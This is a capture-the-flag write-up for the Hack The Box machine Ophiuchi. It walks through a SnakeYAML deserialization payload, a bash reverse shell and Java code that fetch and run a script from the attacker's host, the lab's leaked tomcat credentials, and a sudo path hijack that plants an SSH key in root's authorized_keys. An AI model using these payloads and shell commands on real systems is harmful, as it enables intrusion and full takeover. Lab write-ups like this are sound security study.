# Enumeration

## Nmap

#### Stage 1: Quick Scan to see all the open ports

```bash
sudo nmap --max-retries 0 -p- 10.10.10.227                                   130 â†µ

#### Stage 2 : Targeted Scan

- We can run custom scripts and enumerate versions on the open ports
```bash

## Gobuster
- We can run gobuster but we can see that there are no useful websites to list (% being a bad character). 
```bash
/test                 (Status: 302) [Size: 0] [--> /test/]

```
- The manager directory is password protected, and yaml has the same source code as the base directory of the web page.
- We can enumerate to invalid webpages to see that the tomcat server is hosting a J2EE web application.# Foothold

- We can visit the web page and see that this is a yaml parser, when we put random data in it, we get redirected to a web page.
![[Pasted image 20210403055112.png]]
- When we try to parse something we get redirected to a web page, saying the feature is disabled due to security reasons. We can see that this can be an attack vector for us.
![[Pasted image 20210403055220.png]]
- We can see this blog post regarding it :https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858
- We need to `git clone https://github.com/artsploit/yaml-payload.git`
- So to check if the web app is vulnerable to this exploit, run a python server on a random directory and put in the payload
```
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://10.10.14.5:8000"]  
  ]]  
]
```
- We will get a valid response on our local server, and is looking to HEAD in META-INF. (The blog post would define the whole process.)
![[Pasted image 20210403060146.png]]
- We can use the exploit from the git-repo mentioned earlier.

## Creating revshell for upload
- First we need to create a rev shell to upload on the remote machine (Some testing suggested that one-liner revshells weren't working, or maybe I was doing it wrong)
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'" >> revshell.sh
```
- Move this file to yaml-payload/src folder.
- Spin up a python server in yaml-payload/src folder, so that the base directory has META-INF and the artsploit folder present.
- Add these lines to the exploit file
```java
import java.io.IOException;                                                                    [55/251]
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.14.5:8000/revshell.sh -o /tmp/rechsell.sh");
            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
        } catch (IOException e) {
            e.printStackTrace();

... [snip] ...
```
- To execute this file send in the same request to the parser as earlier
![[Pasted image 20210403061422.png]]
- We get a revershell to tomcat. Make the shell interactive 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo; fg
{Press Enter Twice}
```

# Privilege Escalation

- We can run linpeas and see there are two users : admin and root. admin has the user flag and root has the root flag.

## admin
- Our default directory is /opt/tomcat
- There is a file /conf/tomcat-users.xml
- There are creds, we can try for the manager directory --> admin:whythereisalimit
![[Pasted image 20210403061901.png]]
- We are able to login
- ![[Pasted image 20210403061953.png]]
- We can try the same for the user admin `su admin` and provide the password.
![[Pasted image 20210403062050.png]]
- We can cat out the user.txt from admin's home directory.

## root
- We can run `sudo -l` and see that we can run see that we can run go on index.go (with absoulte paths given) as sudo
```bash
admin@ophiuchi:/tmp$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go

```

- Checking the file, we are reading the binary (as ReadBytes function is used) of the main.wasm and then checking for info (maybe some sort of dictionary). If "info" is 1 we are running deploy as sh, and because we can run it as sudo, we will get privilege escalation in this case. 
```go
func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}

```

- Running it as sudo, output : `Not ready to deploy`.
- This must be because the file doesn't have "info" set as "1". But we cannot change main.wasm in this directory nor deploy.
- Unlike go and index.go, main.wasm and deploy.sh don't have their absolute paths set, therefore we can create our own main.wasm and deploy.sh in our home directory and the those files will be used.
- First we need to find resources which can decompile and recompile the file.
- We can download the files on our local system by running `nc -lnvp 9002 > main.wasm` on our local and `cat main.wasm | nc 10.10.14.5 9001` (already checked nc is present on the box). Just to be sure, we can check the `md5sum` on both the files.
- We find this GitHub repository : https://github.com/webassembly/wabt, which has an online demo.
- So WASM is web assembly language, which can run on modern browsers using JS for loading the module.
- So the repository has hosted two websites one to convert this from binary-to-text (https://webassembly.github.io/wabt/demo/wasm2wat/) and then text-to-binary (https://webassembly.github.io/wabt/demo/wat2wasm/).
- We can go through the whole rigamarole of downloading, building... but this is easier.
- So we first upload the binary to convert it to text form.
```
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))

```
- We can see the function "info" is setting the value of the const. as 0, therefore we weren't able to enter the else part of the codem, which ran 'deploy.sh'.
- We can change this 0 --> 1 and copy this over to the sibling site, and download the generated binary.
- Download this binary to the home directory of admin
- Create a blank deeploy.sh, just to test we have reached the else part of the code.
```bash
admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

admin@ophiuchi:~$ ls
deploy.sh  main.wasm  user.txt
admin@ophiuchi:~$ 

```

- Now we can just use deploy.sh to gain root shell, or just the root.txt
- I have just generated a RSA key pair `ssh-keygen -f root_op`
- Then in deploy.sh
```bash
#!/bin/bash
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuGgxEOvrxJPpF0USye7uumOLcX+hGEBHJDKaOj10ioBCIcnPe5JC0gusdlahWXg1ut4GkGJDbaTk+iU+B4mtQMlc4Ddb7d4TDWalw6w1PGBPQPru+9fqd6grYTw3X146rJeyBkTm9SuXguKzdhKJOM628UZJdPhilWDRmdhf3l30P4+g6PXpHiQXr0cc+OpqrMDunFPzc8+DjrNMrZnFfM+XzVecF+3Y5NlEPUrLwkw+ffDS2Vgp61+NA1+HJX99WNrlEo3npu3O+IpN+70zeMw5ZpaAsixZUUz3AVqjST2kc/aJam2JpTf/QipuyH7bLb5prFSytpLnAromw9A7vZjmRvziRbrcVKgX0xSkyfF8gkSRLEqa7cgSs1zfS4ZxvufhkUcsrJKqHleBA85OZ7gNIh+vKphKF1nQ/qDOPnSapI+g0dZtnTBVZky1Mo2G2TGms8eDxelBREkQkrf3faaY82uH5iTx1BJi5vlg8bndIre1hLukypnYKAYgPPBM= norman@kali >> /root/.ssh/authorized_keys
